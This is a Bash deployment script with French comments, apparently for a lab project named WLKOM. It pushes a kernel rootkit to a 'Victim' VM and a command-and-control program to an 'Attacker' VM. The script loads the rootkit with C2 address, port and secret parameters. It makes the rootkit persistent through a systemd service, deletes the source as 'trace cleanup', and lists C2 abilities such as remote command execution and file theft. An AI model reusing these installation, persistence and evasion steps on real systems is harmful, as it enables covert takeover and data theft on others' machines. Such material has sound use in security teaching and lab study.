#!/bin/bash

# =============================================================================
# WLKOM — Script de déploiement auto
# =============================================================================

set -e

# =============================================================================
# COLORS
# =============================================================================
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

# =============================================================================
# CONFIG
# =============================================================================
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_DIR="$(dirname "$SCRIPT_DIR")"
VM_DIR="$PROJECT_DIR/vms"

VM_USER="wlkom"

SSH_KEY_NAME="wlkom_deploy"
SSH_KEY_PATH="$HOME/.ssh/$SSH_KEY_NAME"
SSH_PUB_KEY="$SSH_KEY_PATH.pub"
VM_PASS=""
VM_PASS_HINT="wlkom1234"

ATTACKER_SSH_PORT=2222
VICTIM_SSH_PORT=2223

ATTACKER_IP="192.168.100.10"
VICTIM_IP="192.168.100.20"
C2_PORT=4444

# =============================================================================
# FUNCTIONS
# =============================================================================

log_info()    { echo -e "${CYAN}[INFO]${NC}  $1"; }
log_ok()      { echo -e "${GREEN}[✓]${NC}    $1"; }
log_warn()    { echo -e "${YELLOW}[!]${NC}    $1"; }
log_error()   { echo -e "${RED}[✗]${NC}    $1"; exit 1; }
log_step()    { echo -e "\n${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n${BLUE}$1${NC}\n${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"; }


# Helper SSH (utilise la clé, jamais le mdp)
ssh_run() {
    local port=$1
    shift
    ssh -i "$SSH_KEY_PATH" \
        -o ConnectTimeout=5 \
        -o StrictHostKeyChecking=no \
        -o UserKnownHostsFile=/dev/null \
        -o LogLevel=ERROR \
        -p "$port" "$VM_USER@localhost" "$@"
}

# Helper SCP
scp_push() {
    local port=$1
    local src=$2
    local dst=$3
    scp -i "$SSH_KEY_PATH" \
        -o StrictHostKeyChecking=no \
        -o UserKnownHostsFile=/dev/null \
        -P "$port" -r "$src" "$VM_USER@localhost:$dst"
}

setup_ssh_keys() {
    log_step "Configuration SSH (clé publique)"

    # Demande le mot de passe UNE seule fois
    read -sp "Mot de passe SSH des VMs (user: $VM_USER) : " VM_PASS
    echo ""
    [ -z "$VM_PASS" ] && log_error "Mot de passe vide !"

    # Vérifie que sshpass est installé
    if ! command -v sshpass &>/dev/null; then
        log_error "sshpass non installé. Lance : sudo apt install sshpass"
    fi

    # Génère la clé si elle n'existe pas
    if [ ! -f "$SSH_KEY_PATH" ]; then
        log_info "Génération de la clé SSH..."
        ssh-keygen -t ed25519 -f "$SSH_KEY_PATH" -N "" \
            -C "wlkom_deploy@$(hostname)" > /dev/null 2>&1
        log_ok "Clé générée : $SSH_KEY_PATH"
    else
        log_info "Clé existante trouvée : $SSH_KEY_PATH"
    fi

    # Nettoie les anciens known_hosts pour éviter les conflits
    ssh-keygen -f "$HOME/.ssh/known_hosts" -R "[localhost]:$ATTACKER_SSH_PORT" 2>/dev/null || true
    ssh-keygen -f "$HOME/.ssh/known_hosts" -R "[localhost]:$VICTIM_SSH_PORT"   2>/dev/null || true

    # Copie la clé sur chaque VM
    local failed=0

    for PORT in $ATTACKER_SSH_PORT $VICTIM_SSH_PORT; do
        local LABEL
        [ "$PORT" = "$ATTACKER_SSH_PORT" ] && LABEL="Attacker" || LABEL="Victim"

        log_info "Copie de la clé sur $LABEL (port $PORT)..."

        if sshpass -p "$VM_PASS" ssh-copy-id \
            -i "$SSH_PUB_KEY" \
            -p "$PORT" \
            -o StrictHostKeyChecking=no \
            -o UserKnownHostsFile=/dev/null \
            "$VM_USER@localhost" 2>/dev/null; then

            log_ok "Clé copiée sur $LABEL"
        else
            log_warn "Échec sur $LABEL (port $PORT)"
            failed=$((failed + 1))
        fi
    done

    # Bloque si aucune VM n'est accessible
    if [ "$failed" -eq 2 ]; then
        echo ""
        log_error "Impossible de joindre les deux VMs. Vérifie :
        1. Les VMs sont démarrées
        2. SSH écoute sur les ports $ATTACKER_SSH_PORT et $VICTIM_SSH_PORT
        3. Le mot de passe est correct
        → Test manuel : sshpass -p 'mdp' ssh -p $ATTACKER_SSH_PORT $VM_USER@localhost"
    fi

    [ "$failed" -eq 1 ] && log_warn "Clé copiée sur 1/2 VMs seulement, continue..."

    # Vérification finale que les clés fonctionnent
    log_info "Vérification des clés..."
    for PORT in $ATTACKER_SSH_PORT $VICTIM_SSH_PORT; do
        local LABEL
        [ "$PORT" = "$ATTACKER_SSH_PORT" ] && LABEL="Attacker" || LABEL="Victim"

        if ssh -i "$SSH_KEY_PATH" \
            -o ConnectTimeout=3 \
            -o StrictHostKeyChecking=no \
            -o UserKnownHostsFile=/dev/null \
            -p "$PORT" "$VM_USER@localhost" "echo OK" 2>/dev/null | grep -q "OK"; then
            log_ok "Clé validée sur $LABEL"
        else
            log_error "La clé ne fonctionne pas sur $LABEL (port $PORT) !"
        fi
    done

    # Plus besoin du mot de passe après ici
    VM_PASS=""
}

# Test SSH
test_ssh() {
    local port=$1
    local label=$2

    log_info "Vérification SSH sur port $port ($label)..."

    for i in {1..30}; do
        if ssh_run "$port" "exit" 2>/dev/null; then
            log_ok "$label accessible via SSH"
            return 0
        fi
        echo -n "."
        sleep 1
    done

    log_error "$label non accessible après 30s (port $port)"
}

setup_network() {
    log_step "Configuration réseau (ens4)"

    log_info "Configuration ens4 sur Attacker (192.168.100.10)..."
    ssh_run $ATTACKER_SSH_PORT "sudo tee /etc/network/interfaces.d/ens4 > /dev/null << 'EOF'
auto ens4
iface ens4 inet static
    address 192.168.100.10
    netmask 255.255.255.0
EOF"
    ssh_run $ATTACKER_SSH_PORT "sudo ip addr add 192.168.100.10/24 dev ens4 2>/dev/null || true && sudo ip link set ens4 up"
    log_ok "Attacker ens4 configurée"

    log_info "Configuration ens4 sur Victim (192.168.100.20)..."
    ssh_run $VICTIM_SSH_PORT "sudo tee /etc/network/interfaces.d/ens4 > /dev/null << 'EOF'
auto ens4
iface ens4 inet static
    address 192.168.100.20
    netmask 255.255.255.0
EOF"
    ssh_run $VICTIM_SSH_PORT "sudo ip addr add 192.168.100.20/24 dev ens4 2>/dev/null || true && sudo ip link set ens4 up"
    log_ok "Victim ens4 configurée"

    log_info "Test ping Victim -> Attacker..."
    if ssh_run $VICTIM_SSH_PORT "ping -c 2 -W 2 192.168.100.10 > /dev/null 2>&1"; then
        log_ok "Réseau interne fonctionnel"
    else
        log_warn "Ping échoué, vérifie que les deux VMs sont démarrées"
    fi
}


# Vérifier les chemins
check_paths() {
    log_step "Vérification des chemins"
    
    [ ! -d "$PROJECT_DIR/attacking_program" ] && log_error "Dossier attacking_program introuvable"
    log_ok "attacking_program trouvé"
    
    [ ! -d "$PROJECT_DIR/rootkit" ] && log_error "Dossier rootkit introuvable"
    log_ok "rootkit trouvé"
}

# Copier attacking_program
deploy_attacking_program() {
    log_step "Déploiement attacking_program vers attacker"
    
    log_info "Suppression ancien dossier (si existe)..."
    ssh_run $ATTACKER_SSH_PORT "rm -rf ~/attacking_program" || true
    
    log_info "Copie attacking_program..."
    scp_push $ATTACKER_SSH_PORT "$PROJECT_DIR/attacking_program" "~/"    
    log_ok "attacking_program copié"
    
    log_info "Compilation..."

    ssh_run $ATTACKER_SSH_PORT "cd ~/attacking_program && make clean && make 2>&1 | tail -n 5"
    log_ok "attacking_program compilé"
}

# Copier rootkit
deploy_rootkit() {
    log_step "Déploiement rootkit vers victim"
    
    log_info "Suppression ancien dossier (si existe)..."
    ssh_run $VICTIM_SSH_PORT "rm -rf ~/rootkit" || true
    
    log_info "Copie rootkit..."
    scp_push $VICTIM_SSH_PORT "$PROJECT_DIR/rootkit" "~/"    
    log_ok "rootkit copié"
}

# Compiler et installer rootkit
install_rootkit() {
    log_step "Installation du rootkit"

    log_info "Installation linux-headers..."
    ssh_run $VICTIM_SSH_PORT \
        "sudo apt update -q && sudo apt install -y linux-headers-\$(uname -r) 2>&1 | tail -n 5" || true
    log_ok "linux-headers installés"

    log_info "Compilation du rootkit..."
    ssh_run $VICTIM_SSH_PORT "cd ~/rootkit && make clean && make 2>&1 | tail -n 5"
    log_ok "rootkit compilé"

    log_info "Chargement du rootkit..."
    ssh_run $VICTIM_SSH_PORT \
        "cd ~/rootkit && sudo insmod wlkom.ko c2_ip=$ATTACKER_IP c2_port=$C2_PORT secret=wlk0m_s3cr3t"
    log_ok "rootkit chargé en mémoire"
}

# Persistence
setup_persistence() {
    log_step "Configuration de la persistance"
    
    ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
        -p $VICTIM_SSH_PORT $VM_USER@localhost "bash -s" << 'PERSIST_SCRIPT'
set -e

echo "[*] Copie du module kernel..."
sudo mkdir -p /lib/modules/$(uname -r)/kernel/wlkom
sudo cp ~/rootkit/wlkom.ko /lib/modules/$(uname -r)/kernel/wlkom/
sudo depmod -a

echo "[*] Création du service systemd..."
sudo tee /etc/systemd/system/wlkom.service > /dev/null << 'SERVICE'
[Unit]
Description=WLKOM Kernel Module
After=network.target

[Service]
Type=oneshot
ExecStart=/sbin/insmod /lib/modules/$(uname -r)/kernel/wlkom/wlkom.ko c2_ip=192.168.100.10 c2_port=4444 secret=wlk0m_s3cr3t
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
SERVICE

echo "[*] Activation du service..."
sudo systemctl daemon-reload
sudo systemctl enable wlkom.service

echo "[✓] Persistance OK"
PERSIST_SCRIPT

    log_ok "Persistance configurée"
}

# Cleanup
cleanup() {
    log_step "Nettoyage des traces"
    
    log_info "Suppression du dossier ~/rootkit..."
    ssh_run $VICTIM_SSH_PORT "rm -rf ~/rootkit"
    log_ok "Traces supprimées"
}

# Verification
verify_rootkit() {
    log_step "Vérification"
    
    log_info "Vérification du chargement du rootkit..."
    RESULT=$(ssh_run $VICTIM_SSH_PORT "lsmod | grep wlkom" || true)
    
    if [ -n "$RESULT" ]; then
        log_ok "Rootkit actif :"
        echo -e "    ${GREEN}$RESULT${NC}"
    else
        log_warn "wlkom non trouvé dans lsmod (vérifier les logs du rootkit)"
    fi
}

# =============================================================================
# MAIN
# =============================================================================

main() {
    echo -e "${RED}"
    echo "██╗    ██╗██╗     ██╗  ██╗ ██████╗ ███╗   ███╗"
    echo "██║    ██║██║     ██║ ██╔╝██╔═══██╗████╗ ████║"
    echo "██║ █╗ ██║██║     █████╔╝ ██║   ██║██╔████╔██║"
    echo "██║███╗██║██║     ██╔═██╗ ██║   ██║██║╚██╔╝██║"
    echo "╚███╔███╔╝███████╗██║  ██╗╚██████╔╝██║ ╚═╝ ██║"
    echo " ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝"
    echo -e "${NC}"
    echo "  Deployment Script"
    echo ""
    
    setup_ssh_keys
    check_paths
    test_ssh $ATTACKER_SSH_PORT "Attacker"
    test_ssh $VICTIM_SSH_PORT "Victim"
    setup_network
    deploy_attacking_program
    deploy_rootkit
    install_rootkit
    setup_persistence
    cleanup
    verify_rootkit
    
    print_next_steps
}

# Prochaines étapes
print_next_steps() {
    log_step "DÉPLOIEMENT TERMINÉ ✓"
    
    echo ""
    echo -e "  ${GREEN}Tout est en place !${NC}"
    echo ""
    echo -e "  ${YELLOW}═══════════════════════════════════${NC}"
    echo -e "  ${YELLOW}PROCHAINES ÉTAPES${NC}"
    echo -e "  ${YELLOW}═══════════════════════════════════${NC}"
    echo ""
    echo -e "  ${CYAN}1️⃣  Sur la VM Attacker${NC}"
    echo -e "      Lancez le module WLKOM C2 :"
    echo ""
    echo -e "      ${GREEN}cd ~/attacking_program${NC}"
    echo -e "      ${GREEN}./wlkom_c2 4444${NC}"
    echo ""
    echo -e "  ${CYAN}ℹ️  Note :${NC} Le serveur écoute sur le port 4444"
    echo -e "      Le rootkit tentera de se connecter automatiquement"
    echo ""
    echo -e "  ${YELLOW}═══════════════════════════════════${NC}"
    echo -e "  ${YELLOW}CONTRÔLE DU ROOTKIT${NC}"
    echo -e "  ${YELLOW}═══════════════════════════════════${NC}"
    echo ""
    echo -e "  Une fois connecté au serveur C2, vous pouvez :"
    echo ""
    echo -e "    • Envoyer des commandes à exécuter sur la victime"
    echo -e "    • Télécharger des fichiers depuis la victime"
    echo -e "    • Uploader des fichiers vers la victime"
    echo -e "    • etc..."
    echo ""
    echo -e "  ${YELLOW}═══════════════════════════════════${NC}"
    echo -e "  ${YELLOW}INFOS VMS${NC}"
    echo -e "  ${YELLOW}═══════════════════════════════════${NC}"
    echo ""
    echo -e "  ${CYAN}Attacker${NC}"
    echo -e "    IP SSH (hors VM / connexion à distance) : localhost:2222"
    echo -e "    Utilisateur : ${VM_USER}"
    echo -e "    Mot de passe : ${VM_PASS_HINT}"
    echo ""
    echo -e "  ${CYAN}Victim${NC}"
    echo -e "    IP SSH (hors VM / connexion à distance) : localhost:2223"
    echo -e "    Utilisateur : ${VM_USER}"
    echo -e "    Mot de passe : ${VM_PASS_HINT}"
    echo -e "    Rootkit C2 port : ${C2_PORT}"
    echo -e "    Rootkit C2 IP : ${ATTACKER_IP}"
    echo ""
    echo -e "  ${YELLOW}═══════════════════════════════════${NC}"
    echo ""
}

main
